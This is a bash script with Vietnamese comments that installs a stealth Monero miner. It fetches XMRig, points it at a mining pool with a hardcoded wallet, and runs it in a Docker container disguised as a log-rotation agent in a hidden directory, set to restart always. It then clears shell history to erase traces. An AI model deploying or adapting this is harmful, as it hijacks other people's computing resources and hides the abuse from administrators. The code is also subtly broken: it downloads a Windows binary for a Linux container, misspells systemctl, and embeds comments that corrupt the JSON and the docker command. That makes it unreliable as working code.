#!/bin/bash

# ========== KIỂM TRA PHỤ THUỘC ========== 
command -v docker >/dev/null || { echo "❌ Docker chưa cài."; exit 1; } 
command -v curl >/dev/null || { echo "❌ curl chưa cài."; exit 1; }

# ========== CẤU HÌNH ========== 
WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz} 
CONTAINER_NAME=${CONTAINER_NAME:-logrotate-agent} 
IMAGE_NAME=${IMAGE_NAME:-stealth-xmrig} 

# ========== LẤY SỐ CORE CPU VÀ TÍNH THREAD_HINT ========== 
CPU_CORES=$(nproc)  # Lấy số lượng core CPU 
THREAD_HINT=$(echo "$CPU_CORES * 0.8" | bc)  # Tính 80% số core (có thể thay đổi tỷ lệ này)

XMRIG_ZIP_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" 
EXPECTED_SHA256="1d903d39c7e4e1706c32c44721d6a6c851aa8c4c10df1479478ee93cd67301bc"  # SHA256 chính xác của file tải về

# ========== DỌN DẸP CŨ ========== 
sudo su

systemctl unmask docker
systemctl unmask docker.socket
systemclt unmask containerd.service
docker rm -f "$CONTAINER_NAME" 2>/dev/null

# ========== TẠO THƯ MỤC TẠM ========== 
WORKDIR=$(mktemp -d) 
cd "$WORKDIR" || exit 1

# ========== TẢI VÀ KIỂM TRA ========== 
echo "[*] Tải XMRig..." 
curl -L -o xmrig.zip "$XMRIG_ZIP_URL"

# Kiểm tra hash SHA256 của file tải về 
ACTUAL_SHA256=$(sha256sum xmrig.zip | awk '{ print $1 }') 
if [ "$ACTUAL_SHA256" != "$EXPECTED_SHA256" ]; then 
  echo "❌ Hash không khớp. Đã tải file bị sửa đổi." 
  exit 1 
fi 
echo "[✓] Kiểm tra hash thành công."

unzip xmrig.zip >/dev/null 2>&1 
mv xmrig*/xmrig .

# ========== TẠO CONFIG ========== 
cat > config.json <<EOF 
{ 
  "autosave": true, 
  "cpu": { 
    "enabled": true, 
    "max-threads-hint": $THREAD_HINT,  # Sử dụng số luồng tính toán từ CPU_CORES
    "priority": 0 
  }, 
  "pools": [ 
    { 
      "url": "supportxmr.com:443", 
      "user": "$WALLET", 
      "tls": true 
    } 
  ] 
}
EOF

# ========== Dockerfile ========== 
cat > Dockerfile <<EOF 
FROM ubuntu:20.04

RUN apt-get update && \
    apt-get install -y libhwloc-dev curl unzip && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

WORKDIR /opt/.logs
COPY xmrig /opt/.logs/log-agent
COPY config.json /opt/.logs/config.json

RUN chmod 700 /opt/.logs/log-agent && chmod 600 /opt/.logs/config.json

ENTRYPOINT ["/opt/.logs/log-agent", "--config=/opt/.logs/config.json"]
EOF

# ========== BUILD ========== 
echo "[*] Build Docker image..." 
docker build -t "$IMAGE_NAME" . || { echo "❌ Build thất bại"; exit 1; }

# ========== RUN ========== 
echo "[*] Chạy container '$CONTAINER_NAME'..." 
docker run -d --name "$CONTAINER_NAME" \
  --cpus="0.8" --memory="256m" \  # Điều chỉnh phần này nếu cần
  --restart=always \
  --detach \
  --log-driver=syslog \
  "$IMAGE_NAME"

# ========== XOÁ DẤU VẾT ========== 
cd ~ 
rm -rf "$WORKDIR" 
history -c && history -w

echo "[✓] Hoàn tất. Container '$CONTAINER_NAME' đang chạy."
